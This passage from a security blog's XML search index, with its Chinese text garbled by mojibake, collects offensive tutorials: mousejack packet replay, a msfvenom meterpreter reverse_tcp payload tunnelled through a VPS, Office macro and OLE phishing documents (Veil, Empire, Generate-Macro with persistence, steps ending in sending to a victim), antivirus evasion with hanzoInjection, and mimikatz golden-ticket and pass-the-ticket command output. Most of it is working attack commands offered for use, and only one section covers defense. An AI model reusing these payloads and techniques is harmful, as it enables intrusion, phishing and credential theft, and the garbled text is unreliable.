è„šæœ¬ä¸Šä¿®æ”¹ï¼Œé¦–å…ˆé€šè¿‡Pingè·å–å¯ç”¨ä¿¡é“ï¼Œç„¶åè¯»å–pack.logä¸­çš„æ•°æ®åŒ…å†…å®¹ï¼Œå°†æ¯ä¸€æ¡æ•°æ®å‘é€åˆ°å„ä¸ªä¿¡é“ï¼Œå®Œæˆæ•°æ®åŒ…é‡æ”¾,æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå‘ç°å¯ç”¨åœ°å€ä¸€èˆ¬ä¸º3-4ä¸ªï¼Œæ‰€ä»¥å°†åŸè„šæœ¬æ”¹æˆrang(4)ï¼š 1234567891011usage: ./mousejack-replay.py [-h] [-c N [N ...]] [-v] [-l] -a ADDRESS [-p PASSES] [-k ACK_TIMEOUT] [-r RETRIES]optional arguments: -h, --help show this help message and exit -c N [N ...], --channels N [N ...] RF channels -v, --verbose Enable verbose output -l, --lna Enable the LNA (for CrazyRadio PA dongles) -a ADDRESS, --address ADDRESS Known address -p PASSES, --passes PASSES Number of passes (default 2) -k ACK_TIMEOUT, --ack_timeout ACK_TIMEOUT ACK timeout in microseconds, accepts [250,4000], step 250 -r RETRIES, --retries RETRIES Auto retry limit, accepts [0,15] æŒ‡å®šåœ°å€ä¸º 61:49:66:82:03 çš„è®¾å¤‡è¿›è¡Œæ•°æ®åŒ…é‡æ”¾ï¼š 1./mousejack-replay.py -a 61:49:66:82:03 0x03å¤‡æ³¨ä»¥ä¸Šä¸ºä¸ªäººæµ‹è¯•ç»“æœï¼Œç”±äºç›®å‰æ‰‹ä¸Šåªæœ‰ä¸€ä¸ªé¼ æ ‡å¯ä»¥æµ‹è¯•ï¼Œå¯èƒ½å¹¶ä¸é€‚ç”¨æ‰€æœ‰å­˜åœ¨æ¼æ´è®¾å¤‡ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´å¯ä»¥æ‰¾æˆ‘ä¸€èµ·ç ”ç©¶ï¼Œå¯ä»¥å¯¹è„šæœ¬è¿›è¡Œè¿›ä¸€æ­¥çš„å®Œå–„ã€‚ å³é”®ç‚¹å‡»æ¼”ç¤ºè§†é¢‘ï¼šhttp://v.youku.com/v_show/id_XMTUwMTQ3Njk4NA==.html æ•°æ®é‡æ”¾æ¼”ç¤ºè§†é¢‘ï¼šhttp://v.youku.com/v_show/id_XMTUwMzgwMTQ1Ng==.html è§†é¢‘å½•çš„ä¸å¤ªå¥½ï¼Œçœ‹ä¸å¤ªæ¸…æ¥šæ•ˆæœï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´å¯ä»¥æµ‹è¯•ä¸€ä¸‹ã€‚]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>mousejack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mousejack æµ‹è¯•]]></title>
    <url>%2Farchives%2Fmousejack.html</url>
    <content type="text"><![CDATA[å³é”®ç‚¹å‡»æµ‹è¯•è§†é¢‘ï¼š]]></content>
      <categories>
        <category>éšä¾¿å†™å†™</category>
      </categories>
      <tags>
        <tag>mousejack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é€šè¿‡VPS SSHéš§é“ä½¿ç”¨æœ¬åœ°msf]]></title>
    <url>%2Farchives%2FPort_Forward_using_VPS_SSH_Tunnel.html</url>
    <content type="text"><![CDATA[è¿™é‡Œé¦–å…ˆéœ€è¦é…ç½®VPS sshæœåŠ¡ç¼–è¾‘ /etc/ssh/sshd_configåœ¨æ–‡ä»¶æœ€åæ·»åŠ ï¼š GatewayPorts yes é‡å¯sshæœåŠ¡ä¹‹åé…ç½®msfå®¢æˆ·ç«¯:1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b â€˜\x00â€™ LHOST=[vpsIP] LPORT=8888 -f exe &gt; abc.exe ä¹‹åæœ¬åœ°å¯ç”¨ç›‘å¬ï¼š12345678910111213msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 192.168.2.100lhost =&gt; 192.168.2.100msf exploit(handler) &gt; set lport 8888lport =&gt; 8888msf exploit(handler) &gt; set exitonsession falseexitonsession =&gt; falsemsf exploit(handler) &gt; exploit -j[*] Exploit running as background job.[*] Started reverse TCP handler on 192.168.2.100:8888 å¼€å¯sshéš§é“ï¼š1ssh -N -R 8888:192.168.2.100:8888 echo@evi1cg.me å®¢æˆ·ç«¯è¢«æ‰§è¡Œä»¥åï¼ŒæˆåŠŸè¿”å›å›è¯ï¼š]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>tunnel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Office Phishing]]></title>
    <url>%2Farchives%2FOffice_Phishing.html</url>
    <content type="text"><![CDATA[Officeä½œä¸ºWindowså¹³å°ä¸‹ä¸€ç§éå¸¸æµè¡Œçš„åŠå…¬è½¯ä»¶ï¼Œè¶Šæ¥è¶Šå¤šçš„APTæ”»å‡»é€šè¿‡æ„é€ æ¶æ„Officeæ–‡ä»¶æ¥è¿›è¡Œå®æ–½ï¼Œè¿™ä¹Ÿæ˜¯æˆåŠŸç‡ä¹Ÿæ˜¯æ¯”è¾ƒé«˜çš„ä¸€ç§æ”»å‡»æ–¹å¼ã€‚å½“ç„¶æœ€éšè”½ï¼Œæœ€æœ‰æ•ˆçš„æ”»å‡»æ–¹å¼å°±æ˜¯é€šè¿‡OfficeåŠå…¬å¥—ä»¶çš„ä¸€äº›0dayæ¥å®æ–½æ”»å‡»ï¼Œä½†æ˜¯è¿™ä¹ŸåŒæ ·å­˜åœ¨ä¸€äº›å¼Šç«¯ï¼Œé¦–å…ˆä¸æ˜¯æ‰€æœ‰äººéƒ½æ‹¥æœ‰0dayï¼Œå…¶æ¬¡é‚£äº›å·²ç»å…¬å¸ƒçš„Xdayå¯èƒ½åªèƒ½é’ˆå¯¹æŸäº›å›ºå®šç‰ˆæœ¬çš„Officeï¼Œæ‰€ä»¥æœ¬æ–‡é‡ç‚¹ä¸åœ¨å¦‚æœä½¿ç”¨Xdayï¼Œè€Œæ˜¯å¯¹ç°åœ¨å·²çŸ¥çš„ä¸€äº›æ„é€ Office Phishing Fileçš„æ–¹å¼åŠæ–¹æ³•è¿›è¡Œæ€»ç»“ï¼Œå¸Œæœ›å¯¹å­¦ä¹ Hackçš„åŒå­¦æœ‰æ‰€å¸®åŠ©ï¼Œå½“ç„¶ä¹Ÿå¸Œæœ›ï¼Œé€šè¿‡æ­¤æ–‡ï¼Œå°ä¼™ä¼´èƒ½é¿å…é­å—æ­¤ç±»æ”»å‡»ã€‚ 0x00 Office å®å®æ˜¯å¾®è½¯å…¬å¸ä¸ºå…¶OFFICEè½¯ä»¶åŒ…è®¾è®¡çš„ä¸€ä¸ªç‰¹æ®ŠåŠŸèƒ½ï¼Œè½¯ä»¶è®¾è®¡è€…ä¸ºäº†è®©äººä»¬åœ¨ä½¿ç”¨è½¯ä»¶è¿›è¡Œå·¥ä½œæ—¶ï¼Œé¿å…ä¸€å†åœ°é‡å¤ç›¸åŒçš„åŠ¨ä½œè€Œè®¾è®¡å‡ºæ¥çš„ä¸€ç§å·¥å…·ï¼Œå®ƒåˆ©ç”¨ç®€å•çš„è¯­æ³•ï¼ŒæŠŠå¸¸ç”¨çš„åŠ¨ä½œå†™æˆå®ï¼Œå½“åœ¨å·¥ä½œæ—¶ï¼Œå°±å¯ä»¥ç›´æ¥åˆ©ç”¨äº‹å…ˆç¼–å¥½çš„å®è‡ªåŠ¨è¿è¡Œï¼Œå»å®ŒæˆæŸé¡¹ç‰¹å®šçš„ä»»åŠ¡ï¼Œè€Œä¸å¿…å†é‡å¤ç›¸åŒçš„åŠ¨ä½œï¼Œç›®çš„æ˜¯è®©ç”¨æˆ·æ–‡æ¡£ä¸­çš„ä¸€äº›ä»»åŠ¡è‡ªåŠ¨åŒ–ã€‚ä½†æ˜¯å®åœ¨æä¾›æ–¹ä¾¿çš„åŒæ—¶ï¼Œä¹Ÿå­˜åœ¨å¾ˆå¤§çš„é£é™©ï¼Œå…¶å±å®³åœ¨Freebufä¸Šä¹Ÿæœ‰è¿‡ç›¸å…³æ–‡ç« ï¼šã€ŠMWI-5ï¼šåˆ©ç”¨Officeå®ä¸‹è½½é”®ç›˜è®°å½•å™¨çš„æ”»å‡»æ´»åŠ¨åˆ†æã€‹ï¼Œä¸‹æ–‡å°†ä¼šä»‹ç»å‡ ä¸ªçŸ¥åå·¥å…·æ„é€ å®åé—¨çš„æ–¹å¼ã€‚ 1ã€ Veilæµ‹è¯•ä½¿ç”¨powershell/shellcode_inject/virtualï¼Œé€‰æ‹©ä»¥åç›´æ¥generate éšä¾¿è¾“å…¥ä¸€ä¸ªåå­—ä¹‹åæˆåŠŸç”Ÿæˆï¼š ç„¶åéœ€è¦ä¸‹è½½ä¸€ä¸ªè½¬æ¢è„šæœ¬ï¼š1â˜ office git clone https://github.com/khr0x40sh/MacroShop.git ä½¿ç”¨ä¸‹è½½çš„pythonè„šæœ¬è½¬æ¢ä¸ºVBAè„šæœ¬ï¼š1root@kali:~/script/MacroShop# python macro_safe.py /usr/share/veil-output/source/test.bat ä¹‹åå°†ç”Ÿæˆçš„å†…å®¹æ·»åŠ åˆ°OFFiceæ–‡ä»¶å®é‡Œé¢ã€‚åˆ›å»ºå®ï¼Œæ³¨æ„é€‰æ‹©å®çš„ä½ç½®ä¸ºå½“å‰æ–‡æ¡£: æ¥ä¸‹æ¥é€‰æ‹©Project ä¸‹é¢çš„Microsoft Wordå¯¹è±¡ï¼Œé€‰æ‹©Document-&gt;open,ç„¶åå°†ç”Ÿæˆçš„ä»£ç ç²˜è¿›å»ã€‚è¦ä¿å­˜çš„ä»£ç å¦‚ä¸‹å›¾ è¿™é‡Œæ³¨æ„ä¸€ç‚¹ï¼Œè„šæœ¬ç”Ÿæˆçš„é»˜è®¤æ˜¯æ‰“å¼€è¡¨æ ¼çš„å®ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œåªè¦å‡½æ•°å†…å®¹ï¼Œæ³¨æ„æ‰“é’©çš„ã€‚ ä¹‹åä¿å­˜ä¸ºå¯ç”¨å®çš„Wordæ–‡æ¡£æˆ–è€…docæ–‡æ¡£ã€‚ å¼€å¯ç›‘å¬ï¼š1root@kali:~/Veil-Evasion# msfconsole -r /usr/share/veil-output/handlers/test_handler.rc æ‰“å¼€wordæ–‡æ¡£ä¼šæœ‰æ­¤æç¤ºï¼š ç‚¹å‡»å¯ç”¨ï¼Œåˆ™ç”Ÿæˆmeterpreterä¼šè¯ã€‚ 2ã€ Nishangnishangçš„ä½¿ç”¨æ—©åœ¨ã€Šä½¿ç”¨powershell Clientè¿›è¡Œæœ‰æ•ˆé’“é±¼ã€‹ æœ‰æ‰€ä»‹ç»ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´å¯ä»¥å†å»çœ‹çœ‹ã€‚ 3ã€ Metasploitä½œä¸ºä¸€ä¸ªç¥å™¨ï¼ŒMsfå½“ç„¶ä¹Ÿå¯ä»¥ç”ŸæˆVBAçš„åé—¨æ–‡ä»¶ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š1â˜ ~ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.100 lport=8888 -e x86/shikata_ga_nai exitfunc=thread -f vba &gt; vcode.txt 4ã€ Empire123456789(Empire) &gt; listeners[!] No listeners currently active (Empire: listeners) &gt; execute(Empire: listeners) &gt; usestager macro(Empire: stager/macro) &gt; set Listener test(Empire: stager/macro) &gt; set OutFile /tmp/macro.txt(Empire: stager/macro) &gt; execute[*] Stager output written out to: /tmp/macro.txt å°†ä»£ç å†™å…¥å®ï¼Œæ‰§è¡Œå¯æˆåŠŸè¿”å›ä¼šè¯ï¼š 5ã€ Scripts1â˜ office git clone https://github.com/enigma0x3/Generate-Macro.git ä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š123456789101112131415161718192021PS C:\Users\Evi1cg\Desktop&gt; . .\Generate-Macro.ps1Enter URL of Invoke-Shellcode script (If you use GitHub, use the raw version): https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-Shellcode.ps1Enter IP Address: 192.168.2.111Enter Port Number: 6666Enter the name of the document (Do not include a file extension): Macro--------Select Attack---------1. Meterpreter Shell with Logon Persistence2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)3. Meterpreter Shell with Alternate Data Stream Persistence4. Meterpreter Shell with Scheduled Task Persistence------------------------------Select Attack Number &amp; Press Enter: 1--------Select Payload---------1. Meterpreter Reverse HTTPS2. Meterpreter Reverse HTTP------------------------------Select Payload Number &amp; Press Enter: 2Saved to file C:\Users\Evi1cg\Desktop\Macro.xlsClean-up Script located at C:\Users\Evi1cg\Desktop\RegistryCleanup.ps1 è¿è¡ŒExcelä»¥ååˆ™ç”Ÿæˆmeterpreterä¼šè¯ï¼š åŒæ—¶ç”Ÿæˆè‡ªå¯åŠ¨åé—¨ï¼š å…·ä½“é”®å€¼ä¸ºHKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load æ¸…é™¤åé—¨å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š12345PS C:\Users\Evi1cg\Desktop&gt; . .\RegistryCleanup.ps1[*]Successfully Removed config.vbs from C:\Users\Public[*]Successfully Removed Malicious Load entry from HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows[!]Path not valid[!]Path not valid å…·ä½“å…¶ä»–åé—¨çš„ä½¿ç”¨ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´å¯æ˜¯è‡ªå·±å®è·µä¸€ä¸‹ã€‚ å…¶ä»–Macroåé—¨ç›¸å…³çš„è„šæœ¬å¦‚ä¸‹ï¼š Old-Powershell-payload-Excel-Delivery OutlookPersistence exe2vba.rb unicorn 0x01 Office OLEOLEæ˜¯Object Linking and Embeddingçš„ç¼©å†™ï¼Œå³â€œå¯¹è±¡é“¾æ¥ä¸åµŒå…¥â€ï¼Œè¿™æ˜¯ä¸€ç§æŠŠä¸€ä¸ªæ–‡ä»¶çš„ä¸€éƒ¨åˆ†åµŒå…¥åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¹‹ä¸­çš„æŠ€æœ¯ï¼Œæ­¤ç±»æ”»å‡»æ–¹å¼ä¹Ÿè¢«å¸¸å¸¸åº”ç”¨äºAPTä¸­ï¼Œå…¶æœ‰ä¸€ä¸ªå¥½å¤„å°±æ˜¯ä¸éœ€è¦ç”¨æˆ·å¼€å¯å®ï¼ŒåŠåœ¨ç¦ç”¨å®çš„æƒ…å†µä¸‹æ‰§è¡Œå‘½ä»¤ã€‚ 1ã€ Outlook OLE@ä¸‰å¥½å­¦ç”Ÿä¹‹å‰åœ¨Zoneé‡Œé¢æ›¾ç»æœ‰ä¸€ä¸ªä»‹ç»ï¼šOutlook OLE é’“é±¼é‚®ä»¶åˆ©ç”¨ä»‹ç»ï¼Œæœ¬äººåœ¨win10+offcie2016ä¸‹ä½œäº†æµ‹è¯•ï¼Œåœ¨è¿™é‡Œåšä¸€ä¸‹ç®€å•çš„ä»‹ç»ï¼Œåˆ¶ä½œæ­¤é’“é±¼æ–‡ä»¶æ­¥éª¤å¦‚ä¸‹ï¼š1ã€æ–°å»ºé‚®ä»¶ï¼Œåœ¨è®¾ç½®æ–‡æœ¬æ ¼å¼å¤„é€‰æ‹©RTFï¼š2ã€é€‰æ‹©æ’å…¥-&gt;å¯¹è±¡-&gt;Packageï¼Œé€‰æ‹©æ˜¾ç¤ºä¸ºå›¾æ ‡ï¼š3ã€ç„¶åå°†å›¾æ ‡æ¢ä¸ºWordå›¾æ ‡ï¼Œå¹¶ä¿®æ”¹é¢˜æ³¨ä¸ºè¿·æƒ‘æ€§åç§°ï¼š4ã€ç»‘å®šæŒ‡å®šç¨‹åºæˆ–è„šæœ¬ï¼›5ã€å°†RTFå†æ”¹ä¸ºHTML ï¼›6ã€æ·»åŠ å…¶ä»–è¿·æƒ‘å†…å®¹ ï¼š7ã€ä¿å­˜ä¸ºtest.msg ï¼›8ã€å‘é€ç»™å—å®³è€…ã€‚å—å®³è€…è¿è¡Œä»¥åä¼šæœ‰ä»¥ä¸‹æç¤ºï¼šç‚¹å‡»æ˜¯ä»¥åä¼šå¼¹ï¼šç‚¹å‡»æ‰“å¼€ï¼ŒæˆåŠŸæ‰§è¡Œï¼š 2ã€ PowerPoint OLEé€šè¿‡PowerPointæ¼”ç¤ºæ–‡ç¨¿è¿›è¡ŒPhishingï¼ŒåŒæ ·ä¸éœ€è¦å¯ç”¨å®ï¼Œåˆ¶ä½œæ­¥éª¤å¦‚ä¸‹ï¼š1ã€åˆ›å»ºæ–°çš„PowerPointæ–‡ä»¶ï¼›2ã€åˆ›å»ºVBSè„šæœ¬ï¼Œä¸ºäº†ç®€å•æ¼”ç¤ºï¼Œåªå†™äº†ä¸€ä¸ªå¼¹æ¡†ï¼š1Msgbox("test") 3ã€å°†VBSæ‹–å…¥PPTï¼›4ã€ä¸ºVBSæ·»åŠ åŠ¨ç”»-&gt;OLEæ“ä½œåŠ¨ä½œå¹¶é€‰æ‹©æ¿€æ´»ï¼Œå¦‚ä¸‹å›¾ï¼š5ã€é€‰æ‹©åŠ¨ç”»çª—æ ¼-&gt;æ•ˆæœé€‰é¡¹ï¼š6ã€é€‰æ‹©è®¡æ—¶-&gt;ä¸ä¸Šä¸€åŠ¨ç”»åŒæ—¶ï¼š7ã€ä¸ºPPTæ·»åŠ å†…å®¹ï¼›8ã€å¦å­˜ä¸ºæ”¾æ˜ æ–‡ä»¶ppsæˆ–è€…ppsxï¼›9ã€å‘é€ç»™å—å®³è€…ã€‚ å—å®³è€…æ‰“å¼€ä¼šå¼¹å‡ºå¦‚ä¸‹æç¤ºæ¡†ï¼šç‚¹å‡»æ‰“å¼€ï¼Œæ‰§è¡Œè„šæœ¬ã€‚ å¯¹äºVBSåé—¨ï¼Œæœ¬æ–‡å°±ä¸å†è¯¦ç»†æè¿°æ€ä¹ˆåˆ¶ä½œäº†ï¼Œå¾ˆå¤šå§¿åŠ¿å°ä¼™ä¼´ä»¬å¯ä»¥è‡ªå·±æœé›†ä¸€ä¸‹ï¼Œæ¯”è¾ƒå¥½ç©å„¿çš„è¯·å‚è€ƒ:JavaScript Phishing å¯¹äºVBSè„šæœ¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªè„šæœ¬æ¥è¿›è¡ŒåŠ å¯†ï¼šncode-and-Decode-a-VB 0x02 é˜²å¾¡å…³äºé€šè¿‡Officeå®æˆ–è€…OLEå¯¹è±¡è¿›è¡Œçš„æ”»å‡»ä»90å¹´ä»£å¼€å§‹äº†ï¼Œç„¶è€Œç°åœ¨è¿˜åœ¨åˆ©ç”¨ä¸­ï¼Œå¦‚ä½•æ›´å¥½åœ°é˜²å¾¡æ­¤ç±»æ”»å‡»å‘¢ï¼Ÿ1ã€ä½ å¯ä»¥æ•™è‚²ä½ çš„å‘˜å·¥ä¸è¦ç‚¹å¯ç”¨å®ï¼Œä¸è¦éšä¾¿ä¹±ç‚¹ç¡®å®šï¼Œä¸è¦éšä¾¿ä¸‹è½½ä¸æ˜æ–‡ä»¶ç­‰ã€‚2ã€é…ç½®ç»„ç­–ç•¥ï¼Œå¦‚æœåœ¨åŸŸä¸‹ï¼Œå¯ä»¥æ‰¹é‡é…ç½®ç®¡ç†æ¨¡æ¿ã€‚è®¾ç½® Disable all except digitally signed macrosï¼š æ›´å¤šç»†èŠ‚è¯·çœ‹è¿™é‡Œ 3ã€å¯¹äº.msgã€.rtfã€.pps åç¼€çš„æ–‡ä»¶è¦æ ¼å¤–æ³¨æ„ï¼›4ã€é‡‡ç”¨EMETï¼Œå¦‚æœä½ ä¸çŸ¥é“EMETæ˜¯ä»€ä¹ˆï¼Œå¯ä»¥çœ‹è¿™é‡Œã€‚ ä»¥ä¸Šæ–¹æ³•æ¥è‡ªäºit-s-time-to-secure-microsoft-officeï¼Œå…³äºè§„åˆ’Officeçš„VBAå®çš„å®‰å…¨è®¾ç½®è¯·çœ‹è¿™é‡Œ.aspx)ã€‚ 0x03 å°ç»“ä½¿ç”¨Officeè¿›è¡ŒAPTæ”»å‡»çš„æƒ…å½¢è¶Šæ¥è¶Šå¤šï¼Œåœ¨æ²¡æœ‰0dayçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åº”è¯¥è‡³å°‘å¯¹äºä»¥ä¸Šç±»å‹çš„é’“é±¼æ”»å‡»è¿›è¡Œäº†è§£åŠé˜²èŒƒï¼Œä»¥ä¸Šä¸ºä¸ªäººæ‰€äº†è§£çš„å‡ ç§æ„é€ Officeé’“é±¼æ–‡ä»¶çš„æ–¹å¼ï¼Œå¯èƒ½å¹¶ä¸å…¨é¢ï¼Œå¦‚æœå°ä¼™ä¼´è¿˜æœ‰åˆ«çš„å§¿åŠ¿ï¼Œè¯·ä¸åèµæ•™ã€‚ 0x04 å‚è€ƒ http://phishme.com/powerpoint-and-custom-actions/ http://zone.wooyun.org/content/24657 https://medium.com/@networksecurity/oleoutlook-bypass-almost-every-corporate-security-control-with-a-point-n-click-gui-37f4cbc107d0#.92vne7zgd https://www.youtube.com/watch?v=xm4PwyPCacw https://www.youtube.com/watch?v=j0CnVokavtI]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>office</tag>
        <tag>phishing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows domain credentials phishing tool]]></title>
    <url>%2Farchives%2Fwindows-domain-credentials-phishing-tool.html</url>
    <content type="text"><![CDATA[ä¸‹è½½åœ°å€ï¼šæˆ³æˆ‘ DEMO: http://player.vimeo.com/video/89782344?portrait=0&amp;color=c9ff23]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bypassAV_hanzoInjection]]></title>
    <url>%2Farchives%2FbypassAV_hanzoInjection.html</url>
    <content type="text"><![CDATA[ä¸‹è½½hanzoInjection1git clone https://github.com/P0cL4bs/hanzoInjection.git ä½¿ç”¨æ–¹å¼ï¼š1234567891011121314151617181920212223242526sage: HanzoInjection.exe [Options] [-h] [-e] [-o] [-p] [-b]the HanzoIjection is a tool focused on injecting arbitrary codes in memory to bypass common antivirus solutions. Developer: Mharcos Nesster (mh4x0f)Email:mh4root@gmail.comSite: www.chmodsecurity.com.brGreetx: P0cL4bs Team &#123; N4sss , MMXM , Chrislley, MovCode, joridos &#125; -------------------------------------------------------------------Arguments Options: OPTION TYPE DESCRIPTION -e,--execute [.raw] Name of file.bin, payload metasploit type raw -p,--payload [.raw] Payload meterpreter type [RAW] requered parameter -o [output] -o,--output [file.cs] Output generate project file.cs injection memory payload c# -b,--binder [NULL] Binder File EXE with encrypt file PE not requered paramenter -h,--help [Help] show this help and exitExample Usage: HanzoInjection.exe -e payload_meterpreter.bin HanzoInjection.exe -p meterpreter.bin -o injection_memory.cs HanzoInjection.exe -b ç”Ÿæˆpaylaod1â˜ ~ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.100 lport=4444 -f raw -o ~/Desktop/test.bin æ£€æµ‹ï¼š ä½¿ç”¨hanzoInjectionç”Ÿæˆcs:1â˜ hanzoInjection [master] wine HanzoInjection.exe -p ~/Desktop/test.bin -o ~/Desktop/test.cs ä¹‹åä½¿ç”¨vsç¼–è¯‘csï¼š å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¿®æ”¹ç¼–è¯‘å™¨å…è®¸ä¸å®‰å…¨ä»£ç ã€‚ ç”Ÿæˆçš„æ–‡ä»¶æ£€æµ‹ç»“æœ: è™½ç„¶è¿˜æœ‰æŠ¥æ¯’ï¼Œä½†æ˜¯å·²ç»å¯ä»¥è¿‡å¾ˆå¤šæ€è½¯äº†ã€‚æµ‹è¯•å¯ä»¥ä¸Šçº¿ï¼š]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Domain Administrator in 17 seconds]]></title>
    <url>%2Farchives%2FDomain_Administrator_in_17_seconds.html</url>
    <content type="text"><![CDATA[https://github.com/gojhonny/CredCrack]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Kerberos]]></title>
    <url>%2Farchives%2FKerberos.html</url>
    <content type="text"><![CDATA[Kerberos Modules12345678910111213141516171819202122232425 .#####. mimikatz 2.0 alpha (x64) release "Kiwi en C" (Oct 9 2015 00:33:13) .## ^ ##. ## / \ ## /* * * ## \ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo) '#####' with 16 modules * * */mimikatz # kerberos::ERROR mimikatz_doLocal ; "(null)" command of "kerberos" module not found !Module : kerberosFull name : Kerberos package moduleDescription : ptt - Pass-the-ticket [NT 6] list - List ticket(s) tgt - Retrieve current TGT purge - Purge ticket(s) golden - Willy Wonka factory hash - Hash password to keys ptc - Pass-the-ccache [NT6] clist - List tickets in MIT/Heimdall ccachemimikatz # Golden Ticket1234567891011121314151617181920mimikatz # kerberos::golden /user:Administrator /domain:sittingduck.info /sid:S-1-5-21-2792304509-1851296738-3446580569 /krbtgt:994ceb7e251e5afc550eef79d8172d64 /ticket:gold.kirbiUser : AdministratorDomain : sittingduck.infoSID : S-1-5-21-2792304509-1851296738-3446580569User Id : 500Groups Id : *513 512 520 518 519ServiceKey: 994ceb7e251e5afc550eef79d8172d64 - rc4_hmac_ntLifetime : 10/26/2015 11:28:54 PM ; 10/23/2025 11:28:54 PM ; 10/23/2025 11:28:54 PM-&gt; Ticket : gold.kirbi * PAC generated * PAC signed * EncTicketPart generated * EncTicketPart encrypted * KrbCred generatedFinal Ticket Saved to file ! Pass the Ticket12345678910111213mimikatz # kerberos::ptt gold.kirbi 0 - File 'gold.kirbi' : OKmimikatz # kerberos::list[00000000] - 0x00000017 - rc4_hmac_nt Start/End/MaxRenew: 10/26/2015 11:28:54 PM ; 10/23/2025 11:28:54 PM ; 10/23/2025 11:28:54 PM Server Name : krbtgt/sittingduck.info @ sittingduck.info Client Name : Administrator @ sittingduck.info Flags 40e00000 : pre_authent ; initial ; renewable ; forwardable ;mimikatz # Injecting tickets with Kirbikator12345678910111213C:\Users\notanadmin\Desktop&gt;kirbikator.exe lsa gold.kirbi .#####. KiRBikator 1.0 (x86) release "Kiwi en C" (Feb 1 2015 03:37:29) .## ^ ##. ## / \ ## /* * * ## \ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com (oe.eo) '#####' * * */Destination : Microsoft LSA API (multiple) &lt; gold.kirbi (RFC KRB-CRED (#22)) &gt; Ticket Administrator@sittingduck.info-krbtgt~sittingduck.info@sittingduck.info : injected Exporting active tickets12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152mimikatz # kerberos::list /export[00000000] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 60a10000 : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; * Saved to file : 0-60a10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi[00000001] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; * Saved to file : 1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi[00000002] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : cifs/dc1.sittingduck.info @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; * Saved to file : 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi[00000003] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : ldap/dc1.sittingduck.info @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; * Saved to file : 3-40a50000-uberuser@ldap~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi[00000004] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : LDAP/dc1.sittingduck.info/sittingduck.info @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; * Saved to file : 4-40a50000-uberuser@LDAP~dc1.sittingduck.info~sittingduck.info-SITTINGDUCK.INFO.kirbi PSEXEC with standard Kerberos 